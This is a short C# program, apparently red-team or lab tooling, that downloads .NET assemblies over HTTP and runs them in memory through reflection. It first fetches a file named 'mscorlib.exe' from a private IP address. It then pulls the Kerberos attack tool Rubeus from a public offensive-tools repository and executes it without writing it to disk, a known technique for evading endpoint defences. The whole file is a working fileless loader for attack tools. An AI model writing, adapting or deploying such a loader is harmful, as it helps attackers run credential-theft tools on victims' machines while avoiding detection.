using System;
using System.Net;
using System.Reflection;
using System.Threading;

namespace Frieza
{
    class Program
    {

        /*
        static void ReflectFromWeb(string url,int retrycount, int timeoutTimer)
        {
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            WebClient client = new WebClient();
            byte[] programBytes = null;
            while (retrycount>=0 && programBytes ==null)
            {
                try
                {
                    programBytes = client.DownloadData(url);
                }
                catch(WebException ex)
                {
                    Console.WriteLine("Assembly not found yet. sleeping for {0} seconds and retrying another {1} time(s)...", timeoutTimer, retrycount);
                    retrycount--;
                    Thread.Sleep(timeoutTimer * 1000);
                }
            }
            if (programBytes == null)
            {
                Console.WriteLine("Assembly was not found, exitting now...");
                Environment.Exit(-1);
            }
            Assembly dotnetProgram = Assembly.Load(programBytes);
            object[] parameters = new String[] { null };
            dotnetProgram.EntryPoint.Invoke(null, parameters);
        }
        */
        static void ReflectFromWeb(string url, int retrycount, int timeoutTimer)
        {
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            WebClient client = new WebClient();
            byte[] programBytes = null;
            while (retrycount >= 0 && programBytes == null)
            {
                try
                {
                    programBytes = client.DownloadData(url);
                }
                catch (WebException ex)
                {
                    Console.WriteLine("Assembly not found yet. sleeping for {0} seconds and retrying another {1} time(s)...", timeoutTimer, retrycount);
                    retrycount--;
                    Thread.Sleep(timeoutTimer * 1000);
                }
            }
            if (programBytes == null)
            {
                Console.WriteLine("Assembly was not found, exitting now...");
                Environment.Exit(-1);
            }
            Assembly dotnetProgram = Assembly.Load(programBytes);
            object[] parameters = new String[] { null };
            dotnetProgram.EntryPoint.Invoke(null, parameters);
        }
        static void Main(string[] args)
        {
            try
            {
                Console.WriteLine("Hit a key to start");
                Console.ReadKey();
                ReflectFromWeb("http://10.0.2.15/mscorlib.exe",0,0);

            }catch(Exception ex)
            {
                Console.WriteLine(ex.Message);
                Console.WriteLine("could not load mscorlib, exitting gracefully.");
                Environment.Exit(-1);
            }
            try
            {
                ReflectFromWeb("https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.5_Any/Rubeus.exe", 3, 5);
                Console.ReadKey();
            }catch(Exception ex)
            {
                Console.WriteLine(ex.Message);
                Console.ReadKey();
            }
        }
    }
}
